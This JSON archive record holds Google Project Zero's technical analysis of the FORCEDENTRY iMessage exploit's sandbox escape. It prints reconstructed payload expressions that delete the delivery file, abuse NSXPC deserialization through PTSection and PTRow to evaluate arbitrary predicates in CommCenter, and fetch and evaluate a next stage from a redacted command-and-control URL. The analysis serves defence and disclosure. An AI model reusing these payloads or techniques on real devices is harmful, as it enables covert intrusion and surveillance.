{
    "id": "feae6686-70c5-4fbb-b926-dcd746bd0347",
    "created_at": "2023-01-12T15:00:11.217753Z",
    "updated_at": "2025-03-27T02:06:14.915376Z",
    "deleted_at": null,
    "sha1_hash": "53480e1ace9b68ee562450a16f454999abac49da",
    "title": "2022-03-31 - FORCEDENTRY- Sandbox Escape",
    "authors": "",
    "file_creation_date": "2022-05-28T02:07:59Z",
    "file_modification_date": "2022-05-28T02:07:59Z",
    "file_size": 143613,
    "plain_text": "# FORCEDENTRY: Sandbox Escape\n\n**googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html**\n\nPosted by Ian Beer & Samuel Groß of Google Project Zero\n\nWe want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple’s Security Engineering and\nArchitecture (SEAR) group for collaborating with us on the technical analysis. Any editorial opinions reflected below are solely\nProject Zero’s and do not necessarily reflect those of the organizations we collaborated with during this research.\n\n[Late last year we published a writeup of the initial remote code execution stage of FORCEDENTRY, the zero-click iMessage exploit](https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html)\nattributed by Citizen Lab to NSO. By sending a .gif iMessage attachment (which was really a PDF) NSO were able to remotely\ntrigger a heap buffer overflow in the ImageIO JBIG2 decoder. They used that vulnerability to bootstrap a powerful weird\nmachine capable of loading the next stage in the infection process: the sandbox escape.\n\nIn this post we'll take a look at that sandbox escape. It's notable for using only logic bugs. In fact it's unclear where the features that\nit uses end and the vulnerabilities which it abuses begin. Both current and upcoming state-of-the-art mitigations such as Pointer\nAuthentication and Memory Tagging have no impact at all on this sandbox escape.\n\n## An observation\n\nDuring our initial analysis of the .gif file Samuel noticed that rendering the image appeared to leak memory. Running the heap tool\nafter releasing all the associated resources gave the following output:\n\n$ heap $pid\n\n-----------------------------------------------------------\nAll zones: 4631 nodes (826336 bytes)\n\nCOUNT  BYTES   AVG  CLASS_NAME  TYPE  BINARY\n\n=====  =====   ===  ==========  ====  ======\n\n1969  469120  238.3  non-object\n\n825  26400  32.0  JBIG2Bitmap C++  CoreGraphics\n\nheap was able to determine that the leaked memory contained JBIG2Bitmap objects.\n\nUsing the -address option we could find all the individual leaked bitmap objects:\n\n$ heap -address JBIG2Bitmap $pid\n\nand dump them out to files. One of those objects was quite unlike the others:\n\n$ hexdump -C dumpXX.bin | head\n\n00000000 62 70 6c 69 73 74 30 30 |bplist00|\n\n...\n\n00000018    24 76 65 72 73 69 | $versi|\n\n00000020 6f 6e 59 24 61 72 63 68 |onY$arch|\n\n00000028 69 76 65 72 58 24 6f 62 |iverX$ob|\n\n00000030 6a 65 63 74 73 54 24 74 |jectsT$t|\n\n00000038 6f 70          |op   |\n\n00000040    4e 53 4b 65 79 65 | NSKeye|\n\n\n-----\n\n00000048 64 41 72 63 68 69 76 65 |dArchive|\n\n[It's clearly a serialized NSKeyedArchiver. Definitely not what you'd expect to see in a JBIG2Bitmap object. Running strings we see](https://developer.apple.com/documentation/foundation/nskeyedarchiver?language=objc)\nplenty of interesting things (noting that the URL below is redacted):\n\nObjective-C class and selector names:\n\nNSFunctionExpression\n\nNSConstantValueExpression\n\nNSConstantValue\n\nexpressionValueWithObject:context:\n\nfilteredArrayUsingPredicate:\n\n_web_removeFileOnlyAtPath:\n\ncontext:evaluateMobileSubscriberIdentity:\n\nperformSelectorOnMainThread:withObject:waitUntilDone:\n\n...\n\nThe name of the file which delivered the exploit:\n\nXXX.gif\n\nFilesystems paths:\n\n/tmp/com.apple.messages\n\n/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework\n\na URL:\n\nhttps://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA\n\nUsing plutil we can convert the bplist00 binary format to XML. Performing some post-processing and cleanup we can see that the\ntop-level object in the NSKeyedArchiver is a serialized NSFunctionExpression object.\n\n## NSExpression NSPredicate NSExpression\n\nIf you've ever used Core Data or tried to filter a Objective-C collection you might have come across NSPredicates. According to\nApple's public documentation they are used \"to define logical conditions for constraining a search for a fetch or for in-memory\nfiltering\".\n\nFor example, in Objective-C you could filter an NSArray object like this:\n\nNSArray* names = @[@\"one\", @\"two\", @\"three\"];\n\nNSPredicate* pred;\n\npred = [NSPredicate predicateWithFormat:\n\n@\"SELF beginswith[c] 't'\"];\n\nNSLog(@\"%@\", [names filteredArrayUsingPredicate:pred]);\n\nThe predicate is \"SELF beginswith[c] 't'\". This prints an NSArray containing only \"two\" and \"three\".\n\n[NSPredicate predicateWithFormat] builds a predicate object by parsing a small query language, a little like an SQL query.\n\nNSPredicates can be built up from NSExpressions, connected by NSComparisonPredicates (like less-than, greater-than and so on.)\n\n\n-----\n\nNSExpressions themselves can be fairly complex, containing aggregate expressions (like IN and CONTAINS ), subqueries, set\nexpressions, and, most interestingly, function expressions.\n\nPrior to 2007 (in OS X 10.4 and below) function expressions were limited to just the following five extra built-in methods: sum, count,\nmin, max, and average.\n\nBut starting in OS X 10.5 (which would also be around the launch of iOS in 2007) NSFunctionExpressions were extended [to allow](https://developer.apple.com/documentation/foundation/nsexpression)\n[arbitrary method invocations with the FUNCTION keyword:](https://developer.apple.com/documentation/foundation/nsexpression)\n\n\"FUNCTION('abc', 'stringByAppendingString', 'def')\" => @\"abcdef\"\n\nFUNCTION takes a target object, a selector and an optional list of arguments then invokes the selector on the object, passing the\narguments. In this case it will allocate an NSString object @\"abc\" then invoke the stringByAppendingString: selector passing the\nNSString @\"def\", which will evaluate to the NSString @\"abcdef\".\n\nIn addition to the FUNCTION keyword there's CAST which allows full reflection-based access to all Objective-C types (as opposed\nto just being able to invoke selectors on literal strings and integers):\n\n\"FUNCTION(CAST('NSFileManager', 'Class'), 'defaultManager')\"\n\nHere we can get access to the NSFileManager class and call the defaultManager selector to get a reference to a process's shared\nfile manager instance.\n\nThese keywords exist in the string representation of NSPredicates and NSExpressions. Parsing those strings involves creating a\ngraph of NSExpression objects, NSPredicate objects and their subclasses like NSFunctionExpression. It's a serialized version of\nsuch a graph which is present in the JBIG2 bitmap.\n\nNSPredicates using the FUNCTION keyword are effectively Objective-C scripts. With some tricks it's possible to build nested\nfunction calls which can do almost anything you could do in procedural Objective-C. Figuring out some of those tricks was the key to\nthe 2019 [Real World CTF](https://realworldctf.com/) [DezhouInstrumenz challenge, which would evaluate an attacker supplied NSExpression format string.](https://github.com/ChiChou/DezhouInstrumenz/)\nThe [writeup by the challenge author is a great introduction to these ideas and I'd strongly recommend reading that now if you](https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/)\nhaven't. The rest of this post builds on the tricks described in that post.\n\n## A tale of two parts\n\nThe only job of the JBIG2 logic gate machine described in the previous blog post is to cause the deserialization and evaluation of an\nembedded NSFunctionExpression. No attempt is made to get native code execution, ROP, JOP or any similar technique.\n\nPrior to iOS 14.5 the isa field of an Objective-C object was not protected by Pointer Authentication Codes (PAC), so the JBIG2\nmachine builds a fake Objective-C object with a fake isa such that the invocation of the dealloc selector causes the deserialization\n[and evaluation of the NSFunctionExpression. This is very similar to the technique used by Samuel in the 2020 SLOP post.](https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html)\n\nThis NSFunctionExpression has two purposes:\n\nFirstly, it allocates and leaks an ASMKeepAlive object then tries to cover its tracks by finding and deleting the .gif file which\ndelivered the exploit.\n\nSecondly, it builds a payload NSPredicate object then triggers a logic bug to get that NSPredicate object evaluated in the\nCommCenter process, reachable from the IMTranscoderAgent sandbox via the com.apple.commcenter.xpc NSXPC service.\n\nLet's look at those two parts separately:\n\n## Covering tracks\n\nThe outer level NSFunctionExpression calls performSelectorOnMainThread:withObject:waitUntilDone which in turn calls\nmakeObjectsPerformSelector:@\"expressionValueWithObject:context:\" on an NSArray of four NSFunctionExpressions. This allows\nthe four independent NSFunctionExpressions to be evaluated sequentially.\n\nWith some manual cleanup we can recover pseudo-Objective-C versions of the serialized NSFunctionExpressions.\n\nThe first one does this:\n\n[[AMSKeepAlive alloc] initWithName:\"KA\"]\n\nThis allocates and then leaks an AppleMediaServices KeepAlive object The exact purpose of this is unclear\n\n\n-----\n\nThe second entry does this:\n\n[[NSFileManager defaultManager] _web_removeFileOnlyAtPath:\n\n[@\"/tmp/com.apple.messages\" stringByAppendingPathComponent:\n\n[ [ [ [\n\n[NSFileManager defaultManager]\n\nenumeratorAtPath: @\"/tmp/com.apple.messages\"\n\n]\n\nallObjects\n\n]\n\nfilteredArrayUsingPredicate:\n\n[\n\n[NSPredicate predicateWithFormat:\n\n[\n\n[@\"SELF ENDSWITH '\"\n\nstringByAppendingString: \"XXX.gif\"]\n\nstringByAppendingString: \"'\"\n\n]  ] ] ]\n\nfirstObject\n\n]\n\n]\n\n]\n\nReading these single expression NSFunctionExpressions is a little tricky; breaking that down into a more procedural form it's\nequivalent to this:\n\nNSFileManager* fm = [NSFileManager defaultManager];\n\nNSDirectoryEnumerator* dir_enum;\n\ndir_enum = [fm enumeratorAtPath: @\"/tmp/com.apple.messages\"]\n\nNSArray* allTmpFiles = [dir_enum allObjects];\n\nNSString* filter;\n\nfilter = [\"@\"SELF ENDSWITH '\" stringByAppendingString: \"XXX.gif\"];\n\nfilter = [filter stringByAppendingString: \"'\"];\n\nNSPredicate* pred;\n\npred = [NSPredicate predicateWithFormat: filter]\n\nNSArray* matches;\n\nmatches = [allTmpFiles filteredArrayUsingPredicate: pred];\n\nNSString* gif_subpath = [matches firstObject];\n\n\n-----\n\nNSString root @ /tmp/com.apple.messages ;\n\nNSString* full_path;\n\nfull_path = [root stringByAppendingPathComponent: gifSubpath];\n\n[fm _web_removeFileOnlyAtPath: full_path];\n\nThis finds the XXX.gif file used to deliver the exploit which iMessage has stored somewhere under the\n/tmp/com.apple.messages folder and deletes it.\n\nThe other two NSFunctionExpressions build a payload and then trigger its evaluation in CommCenter. For that we need to look at\nNSXPC.\n\n## NSXPC\n\nNSXPC is a semi-transparent remote-procedure-call mechanism for Objective-C. It allows the instantiation of proxy objects in one\nprocess which transparently forward method calls to the \"real\" object in another process:\n\nhttps://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html\n\nI say NSXPC is only semi-transparent because it does enforce some restrictions on what objects are allowed to traverse process\nboundaries. Any object \"exported\" via NSXPC must also define a protocol which designates which methods can be invoked and the\n[allowable types for each argument. The NSXPC programming guide further explains the extra handling required for methods which](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW7)\nrequire collections and other edge cases.\n\nThe low-level serialization used by NSXPC is the same explored by Natalie Silvanovich in her 2019 blog post looking at the fullyremote attack surface of the iPhone. An important observation in that post was that subclasses of classes with any level of\ninheritance are also allowed, as is always the case with NSKeyedUnarchiver deserialization.\n\nThis means that any protocol object which declares a particular type for a field will also, by design, accept any subclass of that type.\n\nThe logical extreme of this would be that a protocol which declared an argument type of NSObject would allow any subclass, which\nis the vast majority of all Objective-C classes.\n\n## Grep to the rescue\n\nThis is fairly easy to analyze automatically. Protocols are defined statically so we can just find them and check each one. Tools like\n[RuntimeBrowser and](https://github.com/nst/RuntimeBrowser/) [classdump can parse the static protocol definitions and output human-readable source code. Grepping the](http://stevenygard.com/projects/class-dump/)\noutput of RuntimeBrowser like this is sufficient to find dozens of cases of NSObject pointers in Objective-C protocols:\n\n$ egrep -Rn \"\\(NSObject \\*\\)arg\" *\n\nNot all the results are necessarily exposed via NSXPC, but some clearly are, including the following two matches in\nCoreTelephony framework:\n\n\n-----\n\nFrameworks/CoreTelephony.framework/\\\n\nCTXPCServiceSubscriberInterface-Protocol.h:39:\n\n-(void)evaluateMobileSubscriberIdentity:\n\n(CTXPCServiceSubscriptionContext *)arg1\n\nidentity:(NSObject *)arg2\n\ncompletion:(void (^)(NSError *))arg3;\n\nFrameworks/CoreTelephony.framework/\\\n\nCTXPCServiceCarrierBundleInterface-Protocol.h:13:\n\n-(void)setWiFiCallingSettingPreferences:\n\n(CTXPCServiceSubscriptionContext *)arg1\n\nkey:(NSString *)arg2\n\nvalue:(NSObject *)arg3\n\ncompletion:(void (^)(NSError *))arg4;\n\nevaluateMobileSubscriberIdentity string appears in the list of selector-like strings we first saw when running strings on the bplist00.\nIndeed, looking at the parsed and beautified NSFunctionExpression we see it doing this:\n\n[ [ [CoreTelephonyClient alloc] init]\n\ncontext:X\n\nevaluateMobileSubscriberIdentity:Y]\n\nThis is a wrapper around the lower-level NSXPC code and the argument passed as Y above to the CoreTelephonyClient method\ncorresponds to the identity:(NSObject *)arg2 argument passed via NSXPC to CommCenter (which is the process that hosts\ncom.apple.commcenter.xpc, the NSXPC service underlying the CoreTelephonyClient). Since the parameter is explicitly named as\nNSObject* we can in fact pass any subclass of NSObject*, including an NSPredicate! Game over?\n\n## Parsing vs Evaluation\n\nIt's not quite that easy. The [DezhouInstrumentz writeup discusses this attack surface and notes that there's an extra, specific](https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/)\nmitigation. When an NSPredicate is deserialized by its initWithCoder: implementation it sets a flag which disables evaluation of the\npredicate until the allowEvaluation method is called.\n\nSo whilst you certainly can pass an NSPredicate* as the identity argument across NSXPC and get it deserialized in\nCommCenter, the implementation of evaluateMobileSubscriberIdentity: in CommCenter is definitely not going to call\nallowEvaluation: to make the predicate safe for evaluation then evaluateWithObject: and then evaluate it.\n\n## Old techniques, new tricks\n\nFrom the exploit we can see that they in fact pass an NSArray with two elements:\n\n[0] = AVSpeechSynthesisVoice\n\n[1] = PTSection {rows = NSArray { [0] = PTRow() }\n\nThe first element is an AVSpeechSynthesisVoice object and the second is a PTSection containing a single PTRow. Why?\n\nPTSection and PTRow are both defined in the PrototypeTools private framework. PrototypeTools isn't loaded in the\nCommCenter target process. Let's look at what happens when an AVSpeechSynthesisVoice is deserialized:\n\n## Finding a voice\n\nAVSpeechSynthesisVoice is implemented in AVFAudio framework which is loaded in CommCenter:\n\n\n-----\n\n$ sudo vmmap pgrep CommCenter | grep AVFAudio\n\n__TEXT 7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW \\\n\n/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio\n\nAssuming that this was the first time that an AVSpeechSynthesisVoice object was created inside CommCenter (which is quite likely)\nthe Objective-C runtime will call the initialize method on the AVSpeechSynthesisVoice class [before instantiating the first instance.](https://developer.apple.com/documentation/objectivec/nsobject/1418639-initialize?language=objc)\n\n[AVSpeechSynthesisVoice initialize] has a dispatch_once block with the following code:\n\nNSBundle* bundle;\n\nbundle = [NSBundle bundleWithPath:\n\n@\"/System/Library/AccessibilityBundles/\\\n\nAXSpeechImplementation.bundle\"];\n\nif (![bundle isLoaded]) {\n\nNSError err;\n\n[bundle loadAndReturnError:&err]\n\n}\n\nSo sending a serialized AVSpeechSynthesisVoice object will cause CommCenter to load the\n/System/Library/AccessibilityBundles/AXSpeechImplementation.bundle library. With some scripting using otool -L to list\ndependencies we can find the following dependency chain from AXSpeechImplementation.bundle to PrototypeTools.framework:\n\n['/System/Library/AccessibilityBundles/\\\n\nAXSpeechImplementation.bundle/AXSpeechImplementation',\n\n'/System/Library/AccessibilityBundles/\\\n\nAXSpeechImplementation.bundle/AXSpeechImplementation',\n\n'/System/Library/PrivateFrameworks/\\\n\nAccessibilityUtilities.framework/AccessibilityUtilities',\n\n'/System/Library/PrivateFrameworks/\\\n\nAccessibilitySharedSupport.framework/AccessibilitySharedSupport',\n\n'/System/Library/PrivateFrameworks/Sharing.framework/Sharing',\n\n'/System/Library/PrivateFrameworks/\\\n\nPrototypeTools.framework/PrototypeTools']\n\nThis explains how the deserialization of a PTSection will succeed. But what's so special about PTSections and PTRows?\n\n## Predicated Sections\n\n[PTRow initwithcoder:] contains the following snippet:\n\nself->condition = [coder decodeObjectOfClass:NSPredicate\n\nforKey:@\"condition\"]\n\n[self->condition allowEvaluation]\n\n\n-----\n\nThis will deserialize an NSPredicate object, assign it to the PTRow member variable condition and call allowEvaluation. This is\nmeant to indicate that the deserializing code considers this predicate safe, but there's no attempt to perform any validation on the\npredicate contents here. They then need one more trick to find a path to which will additionally evaluate the PTRow's condition\npredicate.\n\nHere's a snippet from [PTSection initWithCoder:]:\n\nNSSet* allowed = [NSSet setWithObjects: @[PTRow]]\n\nid* rows = [coder decodeObjectOfClasses:allowed forKey:@\"rows\"]\n\n[self initWithRows:rows]\n\nThis deserializes an array of PTRows and passes them to [PTSection initWithRows] which assigns a copy of the array of\nPTRows to PTSection->rows then calls [self _reloadEnabledRows] which in turn passes each row to [self _shouldEnableRow:]\n\n_shouldEnableRow:row {\n\nif (row->condition) {\n\nreturn [row->condition evaluateWithObject: self->settings]\n\n}\n\n}\n\nAnd thus, by sending a PTSection containing a single PTRow with an attached condition NSPredicate they can cause the\nevaluation of an arbitrary NSPredicate, effectively equivalent to arbitrary code execution in the context of CommCenter.\n\n## Payload 2\n\nThe NSPredicate attached to the PTRow uses a similar trick to the first payload to cause the evaluation of six independent\nNSFunctionExpressions, but this time in the context of the CommCenter process. They're presented here in pseudo Objective-C:\n\n### Expression 1\n\n[ [CaliCalendarAnonymizer sharedAnonymizedStrings]\n\nsetObject:\n\n@[[NSURLComponents\n\ncomponentsWithString:\n\n@\"https://cloudfront.net/XXX/XXX/XXX?aaaa\"], '0']\n\nforKey: @\"0\"\n\n]\n\nThe use of [CaliCalendarAnonymizer sharedAnonymizedStrings] is a trick to enable the array of independent\n[NSFunctionExpressions to have \"local variables\". In this first case they create an NSURLComponents object which is used to build](https://developer.apple.com/documentation/foundation/nsurlcomponents)\nparameterised URLs. This URL builder is then stored in the global dictionary returned by [CaliCalendarAnonymizer\nsharedAnonymizedStrings] under the key \"0\".\n\n### Expression 2\n\n[[NSBundle\n\nbundleWithPath:@\"/System/Library/PrivateFrameworks/\\\n\nSlideshowKit.framework/Frameworks/OpusFoundation.framework\"\n\n] load]\n\n\n-----\n\nThis causes the OpusFoundation library to be loaded. The exact reason for this is unclear, though the dependency graph of\nOpusFoundation does include AuthKit which is used by the next NSFunctionExpression. It's possible that this payload is generic\nand might also be expected to work when evaluated in processes where AuthKit isn't loaded.\n\n### Expression 3\n\n[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]\n\nobjectForKey:@\"0\" ]\n\nsetQueryItems:\n\n[ [ [NSArray arrayWithObject:\n\n[NSURLQueryItem\n\nqueryItemWithName: @\"m\"\n\nvalue:[AKDevice _hardwareModel] ]\n\n] arrayByAddingObject:\n\n[NSURLQueryItem\n\nqueryItemWithName: @\"v\"\n\nvalue:[AKDevice _buildNumber] ]\n\n] arrayByAddingObject:\n\n[NSURLQueryItem\n\nqueryItemWithName: @\"u\"\n\nvalue:[NSString randomString]]\n\n]\n\nThis grabs a reference to the NSURLComponents object stored under the \"0\" key in the global sharedAnonymizedStrings dictionary\nthen parameterizes the HTTP query string with three values:\n\n[AKDevice _hardwareModel] returns a string like \"iPhone12,3\" which determines the exact device model.\n\n[AKDevice _buildNumber] returns a string like \"18A8395\" which in combination with the device model allows determining the exact\nfirmware image running on the device.\n\n[NSString randomString] returns a decimal string representation of a 32-bit random integer like \"394681493\".\n\n### Expression 4\n\n[ [CaliCalendarAnonymizer sharedAnonymizedString]\n\nsetObject:\n\n[NSPropertyListSerialization\n\npropertyListWithData:\n\n[[[NSData\n\ndataWithContentsOfURL:\n\n[[[CaliCalendarAnonymizer sharedAnonymizedStrings]\n\nobjectForKey:@\"0\"] URL]\n\n] AES128DecryptWithPassword:NSData(XXXX)\n\n\n-----\n\n] decompressedDataUsingAlgorithm:3 error:]\n\noptions: Class(NSConstantValueExpression)\n\nformat: Class(NSConstantValueExpression)\n\nerrors:Class(NSConstantValueExpression)\n\n]\n\nforKey:@\"1\"\n\n]\n\nThe innermost reference to sharedAnonymizedStrings here grabs the NSURLComponents object and builds the full url from the\nquery string parameters set last earlier. That url is passed to [NSData dataWithContentsOfURL:] to fetch a data blob from a remote\nserver.\n\nThat data blob is decrypted with a hardcoded AES128 key, decompressed using zlib then parsed as a plist. That parsed plist is\nstored in the sharedAnonymizedStrings dictionary under the key \"1\".\n\n### Expression 5\n\n[ [[NSThread mainThread] threadDictionary]\n\naddEntriesFromDictionary:\n\n[[CaliCalendarAnonymizer sharedAnonymizedStrings]\n\nobjectForKey:@\"1\"]\n\n]\n\nThis copies all the keys and values from the \"next-stage\" plist into the main thread's theadDictionary.\n\n### Expression 6\n\n[ [NSExpression expressionWithFormat:\n\n[[[CaliCalendarAnonymizer sharedAnonymizedStrings]\n\nobjectForKey:@\"1\"]\n\nobjectForKey: @\"a\"]\n\n]\n\nexpressionValueWithObject:nil context:nil\n\n]\n\nFinally, this fetches the value of the \"a\" key from the next-stage plist, parses it as an NSExpression string and evaluates it.\n\n## End of the line\n\nAt this point we lose the ability to follow the exploit. The attackers have escaped the IMTranscoderAgent sandbox, requested a nextstage from the command and control server and executed it, all without any memory corruption or dependencies on particular\nversions of the operating system.\n\nIn response to this exploit [iOS 15.1 significantly reduced the computational power available to NSExpressions:](https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-15_1-release-notes)\n\nNSExpression immediately forbids certain operations that have significant side effects, like creating and destroying objects.\nAdditionally, casting string class names into Class objects with NSConstantValueExpression is deprecated.\n\nIn addition the PTSection and PTRow objects have been hardened with the following check added around the parsing of serialized\nNSPredicates:\n\n\n-----\n\nif (os_variant_allows_internal_security_policies(\n\n\"com.apple.PrototypeTools\") {\n\n[coder decodeObjectOfClass:NSPredicate forKey:@\"condition]\n\n...\n\nObject deserialization across trust boundaries still presents an enormous attack surface however.\n\n## Conclusion\n\nPerhaps the most striking takeaway is the depth of the attack surface reachable from what would hopefully be a fairly constrained\nsandbox. With just two tricks (NSObject pointers in protocols and library loading gadgets) it's likely possible to attack almost every\ninitWithCoder implementation in the dyld_shared_cache. There are presumably many other classes in addition to NSPredicate and\nNSExpression which provide the building blocks for logic-style exploits.\n\nThe expressive power of NSXPC just seems fundamentally ill-suited for use across sandbox boundaries, even though it was\ndesigned with exactly that in mind. The attack surface reachable from inside a sandbox should be minimal, enumerable and\nreviewable. Ideally only code which is required for correct functionality should be reachable; it should be possible to determine\nexactly what that exposed code is and the amount of exposed code should be small enough that manually reviewing it is tractable.\n\nNSXPC requiring developers to explicitly add remotely-exposed methods to interface protocols is a great example of how to make\nthe attack surface enumerable - you can at least find all the entry points fairly easily. However the support for inheritance means that\nthe attack surface exposed there likely isn't reviewable; it's simply too large for anything beyond a basic example.\n\nRefactoring these critical IPC boundaries to be more prescriptive - only allowing a much narrower set of objects in this case - would\nbe a good step towards making the attack surface reviewable. This would probably require fairly significant refactoring for NSXPC;\nit's built around natively supporting the Objective-C inheritance model and is used very broadly. But without such changes the\nexposed attack surface is just too large to audit effectively.\n\nThe advent of Memory Tagging Extensions (MTE), likely shipping in multiple consumer devices across the ARM ecosystem this\nyear, [is a big step in the defense against memory corruption exploitation. But attackers innovate too, and are likely already two](https://www.usenix.org/system/files/login/articles/login_summer19_03_serebryany.pdf)\nsteps ahead with a renewed focus on logic bugs. This sandbox escape exploit is likely a sign of the shift we can expect to see over\nthe next few years if the promises of MTE can be delivered. And this exploit was far more extensible, reliable and generic than\nalmost any memory corruption exploit could ever hope to be.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-31 - FORCEDENTRY- Sandbox Escape.pdf"
    ],
    "report_names": [
        "2022-03-31 - FORCEDENTRY- Sandbox Escape.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535611,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653703679,
    "ts_modification_date": 1653703679,
    "files": {
        "pdf": "https://archive.orkl.eu/53480e1ace9b68ee562450a16f454999abac49da.pdf",
        "text": "https://archive.orkl.eu/53480e1ace9b68ee562450a16f454999abac49da.txt",
        "img": "https://archive.orkl.eu/53480e1ace9b68ee562450a16f454999abac49da.jpg"
    }
}